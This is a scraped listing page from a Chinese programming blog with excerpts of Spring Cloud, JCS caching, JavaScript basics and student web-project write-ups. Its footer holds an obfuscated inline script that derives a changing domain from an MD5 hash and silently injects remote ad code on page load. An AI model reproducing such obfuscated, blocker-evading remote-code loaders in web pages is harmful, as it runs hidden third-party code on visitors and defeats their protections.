前端程序在灰度测试的用户 Header 头中打上标签，例如在 Header 中添加 "gray-tag：true"，表示要访问灰度服务，其他则为正式服务。（前端）在负载均衡器 Spring Cloud LoadBalancer 中，拿到 Header 中的 "gray-tag" 进行判断，如果此标签不为空，并且等于 "true" 的话，则表示要访问灰度发布的服务，否则只访问正式的服务。（客户端负载均衡）在网关 Spring Cloud Gateway 中，将 Header 标签 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ceeb5b6d76a1b2e6860b61f18043bba2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff2258149901fd86b62083f6a7e2c2a0/" rel="bookmark">
			【SpringCloud Alibaba笔记】（1）SpringCloud Alibaba入门简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringCloud Alibaba 为什么会出现SpringCloud Alibaba Spring Cloud Netflix已经进入维护模式，包括以下组件
spring-cloud-netflix-archaiusspring-cloud-netflix-hystrix-contractspring-cloud-netflix-hystrix-dashboardspring-cloud-netflix-hystrix-streamspring-cloud-netflix-hystrixspring-cloud-netflix-ribbonspring-cloud-netflix-turbine-streamspring-cloud-netflix-turbinespring-cloud-netflix-zuul 这不包括Eureka或并发限制模块。
什么是维护模式？
将模块置于维护模式，意味着Spring Cloud团队将不会再向模块添加新功能。
我们将修复block级别的 bug 以及安全问题，我们也会考虑并审查社区的小型pull request。
进入维护模式意味着Spring Cloud Netflix将不再开发新的组件
我们都知道Spring Cloud版本迭代算是比较快的，因而出现了很多重大ISSUE都还来不及Fix就又推另一个Release了。
进入维护模式意思就是目前一直以后一段时间Spring Cloud Netflix提供的服务和功能就这么多了，不在开发新的组件和功能了。以后将以维护和Merge分支Fall equest为主，官方打算继续支持这些模块，知道Greenwich版本被普遍采用至少一年
新组件功能将以其他替代 平代替的方式实现
SpringCloud Alibaba带来了什么 诞生：2018.10.31，Spring Cloud Alibaba正式入驻了Spring Cloud官方孵化器，并在Maven中央库发布了第一个版本。
主要功能 服务限流降级：默认支持WebServlet、WebFlux, OpenFeign、RestTemplate、Spring Cloud Gateway, Zuul, Dubbo和RocketMQ限疯降级功能的接入，可以在运行时通过控制台实时修改限流降级规则，还支持查看限流降级Metrics监控。服务注册与发现：适配Spring Cloud服务注册与发现标准，默认集成了Ribbon的支持。分布式配置管理:支持分布式系统中的外部化配置，配置更改时自动刷新。消息驱动能力：基于Spring Cloud Stream为微服务应用构建消息驱动能力。分布式事务：使用@GlobalTransactional注解，高效并且对业务零侵入地解决分布式事务问题。。阿里云对象存储：阿里云提供的海量、安全、低成本、高可靠的云存储服务。支持在任何应用、任何时间、任何地点存储和访问任意类型的数据。分布式任务调度：提供秒级、精准、高可靠、高可用的定时(基于Cron表达式)任务调度服务。同时提供分布式的任务执行模型，如网格任务。网格任务支持海量子任务均匀分配到所有Worker (schedulerx-client)上执行。阿里云短信服务：覆盖全球的短信服务，友好、高效、智能的互联化通讯能力，帮助企业迅速搭建客户触达通道。 组件 Nacos：一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。RocketMQ：一款开源的分布式消息系统，基于高可用分布式集群技术，提供低延时的、高可靠的消息发布与订阅服务。Dubbo: Apache DubboTM：是一款高性能Java RPC框架。Seata：阿里巴巴开源产品，一个易于使用的高性能微服务分布式事务解决方案。Alibaba Cloud ACM：一款在分布式架构环境中对应用配置进行集中管理和推送的应用配置中心产品。Alibaba Cloud OSS：阿里云对象存储服务(Object Storage Service，简称oSS)，是阿里云提供的海星、安全、低成本、高可靠的云存储服务。您可以在任何应用、任何时间、任何地点存储和访问任意类型的数据。Alibaba Cloud SchedulerX：阿里中间件团队开发的一款分布式任务调度产品，提供秒级、精准高可靠、高可用的定时(基于Cron表达式)任务调度服务。Alibaba Cloud SMS：覆盖全球的短信服务，友好、高效、智能的互联化通讯能力，帮助企业迅速搭建客户触达通道。 如何使用 如果需要使用已发布的版本，在父工程dependencyManagement中添加如下配置。
&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;2.2.3.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; 然后在子工程dependencies中添加自己所需使用的依赖即可使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff2258149901fd86b62083f6a7e2c2a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8636721c08e4462eeb15d4537877390d/" rel="bookmark">
			Apache Commons JCS缓存解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1章：引言 大家好，我是小黑！今天，咱们来聊聊Apache Commons JCS，一个Java界里的缓存大杀器。缓存技术，对于提高应用性能来说，就像是给它加了一剂兴奋剂，能让数据访问变得快如闪电。而Apache Commons JCS，作为一个开源的Java缓存框架，它的出现就像是给了咱们一个超级工具箱，不仅强大而且使用方便。
咱们为什么要选用JCS呢？因为它不仅功能全面，而且还能跟各种应用环境无缝配合，简直是Java程序员的贴心小助手。
第2章：缓存基础和JCS的概述 缓存到底是个什么玩意儿。简单来说，缓存就像是咱们电脑的临时记忆。当应用程序运行时，频繁访问的数据被存放在快速访问的存储区域，也就是缓存里。这样，下次再访问这些数据时，速度就会快很多，因为不用再去原始的存储位置慢慢找了。
那么，Apache Commons JCS又是怎样的存在呢？JCS，全称Java Caching System，是一个用于Java对象的缓存系统。它提供了一系列功能，比如内存缓存、磁盘溢存、集群缓存等，非常适合处理大量数据和高并发的场景。
JCS最大的特点就是易用性和可扩展性。它不仅提供了一系列现成的功能，还允许咱们根据需要进行定制和扩展。比如，你可以配置多级缓存，把不同类型的数据存放在不同的缓存层级中，这样就能更有效地管理和访问数据了。
现在，让我们通过一个简单的Java代码示例来感受一下JCS的魅力。假设小黑要缓存一些用户信息，那么首先得创建一个缓存管理器：
import org.apache.commons.jcs.JCS; import org.apache.commons.jcs.access.CacheAccess; public class UserCache { private CacheAccess&lt;String, User&gt; userCache; public UserCache() { // 初始化缓存管理器 this.userCache = JCS.getInstance("userCache"); } public void addUser(String userId, User user) { // 添加用户到缓存 userCache.put(userId, user); } public User getUser(String userId) { // 从缓存中获取用户信息 return userCache.get(userId); } } 这段代码展示了如何使用JCS来创建和操作一个简单的用户信息缓存。首先，通过JCS.getInstance("userCache")获取一个缓存实例，然后使用put和get方法来添加和检索用户数据。是不是看起来挺简单的？
第3章：JCS的架构和组件 JCS的架构 说起JCS的架构，可以想象成一个多层的结构。在最上面是应用层，这是咱们直接跟JCS打交道的地方。再往下，就是JCS的核心部分，包括了缓存管理器、各种缓存区域和缓存数据的存储逻辑。
JCS的缓存管理器是整个系统的大脑，负责协调各个部分的工作。它管理着多个缓存区域，每个区域都可以有自己的配置和存储策略。这样的设计让JCS非常灵活，可以根据不同的需求设置不同的缓存策略。
JCS的主要组件 接下来，咱们看看JCS的几个关键组件：
内存缓存（Memory Cache）: 这是最快的缓存层级，直接将数据存储在内存中。对于需要快速访问的数据，这里是最佳的存储地点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8636721c08e4462eeb15d4537877390d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdbe2bbeb0c83e4d49431eeb3c30ded2/" rel="bookmark">
			JavaScript----定时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 定时器的介绍 定时器就是在一段特定的时间后执行某段程序代码。
2. 定时器的使用： js 定时器有两种创建方式：
setTimeout(func[, delay, param1, param2, ...]) ：以指定的时间间隔（以毫秒计）调用一次函数的定时器setInterval(func[, delay, param1, param2, ...]) ：以指定的时间间隔（以毫秒计）重复调用一个函数的定时器 setTimeout函数的参数说明:
第一个参数 func , 表示定时器要执行的函数名第二个参数 delay, 表示时间间隔，默认是0，单位是毫秒第三个参数 param1, 表示定时器执行函数的第一个参数，一次类推传入多个执行函数对应的参数。 &lt;script&gt; function hello(){ alert('hello'); } // 执行一次函数的定时器 setTimeout(hello, 500); &lt;/script&gt; setInterval函数的参数说明:
第一个参数 func , 表示定时器要执行的函数名第二个参数 delay, 表示时间间隔，默认是0，单位是毫秒第三个参数 param1, 表示定时器执行函数的第一个参数，一次类推传入多个执行函数对应的参数。 &lt;script&gt; function hello(){ alert('hello'); } // 重复执行函数的定时器 setInterval(hello, 1000); &lt;/script&gt; 2. 清除定时器 js 清除定时器分别是:
clearTimeout(timeoutID) 清除只执行一次的定时器(setTimeout函数)clearInterval(timeoutID) 清除反复执行的定时器(setInterval函数) clearTimeout函数的参数说明:
timeoutID 为调用 setTimeout 函数时所获得的返回值，使用该返回标识符作为参数，可以取消该 setTimeout 所设定的定时执行操作。 &lt;script&gt; function hello(){ alert('hello'); // 清除只执行一次的定时器 clearTimeout(t1) } // 执行一次函数的定时器 t1 = setTimeout(hello, 500); &lt;/script&gt; clearInterval函数的参数说明:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdbe2bbeb0c83e4d49431eeb3c30ded2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d4e8b596701b96f8016f3f1097b0aad/" rel="bookmark">
			JavaScript----字符串拼接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、字符串拼接 字符串拼接使用: "+" 运算符
var iNum1 = 10; var fNum2 = 11.1; var sStr = 'abc'; result = iNum1 + fNum2; alert(result); // 弹出21.1 result = fNum2 + sStr; alert(result); // 弹出11.1abc 说明
数字和字符串拼接会自动进行类型转换(隐士类型转换)，把数字类型转成字符串类型进行拼接
小结 "+" 运算符能够实现字符串的拼接操作 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5b7162b8a712e5079ed176115da63b3/" rel="bookmark">
			nodejs&#43;vue&#43;ElementUi服装租赁系统 服装商城销售系统08f3l
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		。因此服装销售需要网络化、透明化，商家可以通过本系统来对服装数据库中的服装信息，服装样式，服装价格等等一系列信息进行有效的管理。而用户可以通过服装销售系统页面来查询服装的价格，服装的品种等服装信息，并且可以通过系统来进行下单，从而购买服装。这样整个系统便可以做到对商家销售的简单管理化，也方便用户购买服装。
目 录
运行软件:vscode
前端nodejs+vue+ElementUi
语言 node.js
框架：Express/koa
前端:Vue.js
数据库：mysql
开发软件：VScode/webstorm/hbuiderx
采用B/S模式架构系统，开发简单，只需要连接网络即可登录本系统，不需要安装任何客户端。开发工具采用VSCode，前端采用Vue+ElementUI，后端采用Node.js，数据库采用MySQL。
涉及的技术栈
1） 前台页面：
页面结构布局采用Vue框架，可能会使用到第三方组件库Element-ui或View Design组件库、axios发送请求、html和less语法。
2） 后台服务器：
服务器搭建采用基于node的Express框架快速搭建服务器，需要引入mysql模块进行对数据库的操作
3） 数据库：
mysql数据库，Navicat可视化工具辅助操作数据库 均可
该系统将采用B/S结构模式，使用Vue和ElementUI框架搭建前端页面，后端使用Nodejs来搭建服务器，并使用MySQL，通过axios完成前后端的交互 本系统采用的是Html+Css+Vue作为系统的前台实现技术，采用MySQL数据库作为系统数据库、Model2开发模型作为系统的开发模型。 在经过大量的需求分析之后，本系统分为前台用户模块以及后台管理员模块，前台用户模块主要负责服装的浏览、购物车、订单等功能。而后台管理员模块则主要负责服装信息及其类别的管理，订单管理，用户管理的功能前台用户模块应具有以下功能：
1.用户注册和登录功能：用户通过注册并激活之后可以登录访问本系统。登录成功的用户，可以查看系统内的信息。
2.服装展示功能：登录用户或者非登录用户（游客）都可以查看本服装订购系统发布的所有服装信息。
3.服装按类查询功能：登录用户或者游客，可以通过服装的不同类别来查询服装。
4.购物车功能：只有登录后的会员才可以使用购物车，可以向购物车中添加服装，也可以删除购物车中的服装。
5.订单管理功能：只有登录的会员才可以使用该功能，用户可以在该模块中查看订单的详细信息，也可进行付款，以及确认收货的操作。
6.用户信息修改模块：只有登录后才可以使用该模块功能，在该模块中用户可以修改自己的用户名，密码信息。
3.3.2 后台模块
后台管理员操作模块应具有以下功能：
1.用户信息管理：后台管理员可以查询用户信息，也可以删除用户和恢复用户。
2.服装及类别管理：后台管理员可以添加新的服装类别，也可以删除旧类别。
3.订单管理：后台管理员可以根据订单的状态来查询订单信息，还可以进行发货。
4.服装详细信息管理：后台管理员可以对服装进行下架和新品服装上架的处理，还可以修改服装的价格、服装名等。
摘要 1
abstract 1
目 录 2
1 绪论 4
1.1 开发背景 4
1.2 开发意义 4
1.3 研究内容 5
2 开发技术介绍 5
2.2 Html 6
2.3 Java 6
2.4 数据库介绍 7
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5b7162b8a712e5079ed176115da63b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37c799139e0d9b64132bdf3456f04840/" rel="bookmark">
			JavaScript----循环语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 循环语句的介绍 循环语句就是让一部分代码重复执行，javascript中常用的循环语句有:
forwhiledo-while 2. for循环 var array = [1, 4, 5]; for(var index = 0; index &lt; array.length; index++){ result = array[index]; alert(result); } 3. while循环 var array = [1, 4, 5]; var index = 0; while (index &lt; array.length) { result = array[index]; alert(result); index++; } 说明:
当条件成立的时候, while语句会循环执行
4. do-while循环 var array = [1, 4, 5]; var index = 0; do { result = array[index]; alert(result); index++; } while (index &lt; array.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37c799139e0d9b64132bdf3456f04840/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef65ac9efa61ca1456d15287254e2c34/" rel="bookmark">
			python&#43;django动物之家网站-动物救助领养商城20338
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系统主要包括首页、目录指南、救助指南、法律指南、救助组织介绍、救助信息、流宠领养、周边商城、论坛、最新资讯、个人中心、后台管理、购物车；其中管理员：个人中心、用户管理、救助组织管理、目录指南管理、救助指南管理、法律指南管理、救助组织介绍管理、志愿者申请管理、救助信息管理、流宠领养管理、领养申请管理、周边分类管理、周边商城管理、论坛管理、系统管理；救助组织：个人中心、目录指南管理、救助指南管理、法律指南管理、救助组织介绍管理、志愿者申请管理、流宠领养管理、领养申请管理；用户：个人中心、救助信息管理、领养申请管理、我的收藏管理、订单管理等功能，以及后台数据库管理。从网站设计到详细实现都根据了网站的建设思想和 Mysql数据库的设计方法。该系统的应用可以减少工作人员的劳动强度，提高工作效率与管理水平，具有很大的价值。它可以使动物之家网站操作简单，成功率高，使网上动物之家网站的管理向一个更高层次前进。
本系统尝试使用vue框架在网上架构一个动态的动物之家网站。
3.1.1 用户信息管理
技术栈
后端：python+django
前端：vue.js+elementui
框架：django/flask
Python版本：python3.7+
数据库：mysql5.7
数据库工具：Navicat
开发软件：PyCharm .
系统应具备用户信息管理功能，可以通过名字查询来查看用户的信息，管理员用户可对用户信息进行编辑。
3.1.2 目录指南管理
系统应具备目录指南管理功能，可以显示名称、分类、图片、发布日期、审核回复、审核状态，管理员用户可以进行编辑，添加或删除目录指南。增添新目录指南。
3.1.3 救助组织管理
系统应具备救助组织管理功能，允许管理员通过名称进行救助组织信息的查询，管理员用户可以对其进行编辑。新增救助组织信息时，要有救助组织、救助类型、负责人、联系电话等信息。
3.1.4救助组织介绍管理
系统应具备救助组织介绍管理功能，允许管理员通过名称进行救助组织介绍信息的查询，管理员用户可以对其进行编辑。新增救助组织介绍信息时，要有救助组织、救助类型、封面、负责人、联系电话、成立时间、救助范围、审核回复、审核状态等信息。
系统有如下几个重要功能，例如用用户管理、救助组织管理、目录指南管理、救助指南管理、法律指南管理、救助组织介绍管理、志愿者申请管理、救助信息管理、流宠领养管理、领养申请管理
、周边分类管理、周边商城管理、论坛管理、系统管理。该系统角色分为三种权限：管理员、救助组织和用户。管理员可以执行所有的操作，用户只能查看首页、目录指南、救助指南、法律指南、救助组织介绍、救助信息、流宠领养、周边商城、论坛、最新资讯、个人中心、后台管理、购物车等功能。管理员用户可以对用户进行信息编辑，同时可以查看动物信息等内容。改系统应该具备的功能分析如下。
随着internet的发展，人们的日常生活已经离不开网络。未来人们的生活与工作
将变得越来越数字化，网络化和电子化。网上管理，它将是直接管理动物之家网站的最新形式。本论文是以构建动物之家网站为目标，使用vue框架制作，由管理员、用户和救助组织三大部分组成。着重论述了系统设计分析，
目 录
摘要 II
随着internet的发展，人们的日常生活已经离不开网络。未来人们的生活与工作 II
Abstract II
1绪论 1
1.1 研究的背景及意义 1
1.2 技术路线 1
6.测试系统。 1
2相关技术概述 2
2.1 vue简介 2
2.4 MYSQL数据库 3
2.5 MySQL环境配置 3
3 需求分析 5
3.1 功能分析 5
3.1.1 用户信息管理 5
3.1.2 目录指南管理 5
3.1.3 救助组织管理 5
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef65ac9efa61ca1456d15287254e2c34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca0eb09cace88504dfe5a9836e35e53f/" rel="bookmark">
			JavaScript----操作标签元素属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 属性的操作 首先获取的页面标签元素，然后就可以对页面标签元素的属性进行操作，属性的操作包括:
属性的读取属性的设置 属性名在js中的写法
html的属性和js里面属性大多数写法一样，但是“class” 属性写成 “className”“style” 属性里面的属性，有横杠的改成驼峰式，比如：“font-size”，改成”style.fontSize” &lt;style&gt; .sty01{ font-size:20px; color:red; } .sty02{ font-size:30px; color:pink; text-decoration:none; } &lt;/style&gt; &lt;script type="text/javascript"&gt; window.onload = function(){ var oInput = document.getElementById('input1'); var oA = document.getElementById('link1'); // 读取属性值 var sValue = oInput.value; var sType = oInput.type; var sName = oInput.name; var sLinks = oA.href; // 操作class属性,需要写成“className” oA.className = 'sty02'; // 写(设置)属性 oA.style.color = 'red'; oA.style.fontSize = sValue; } &lt;/script&gt; &lt;input type="text" name="setsize" id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca0eb09cace88504dfe5a9836e35e53f/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/4/">«</a>
	<span class="pagination__item pagination__item--current">5/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/6/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>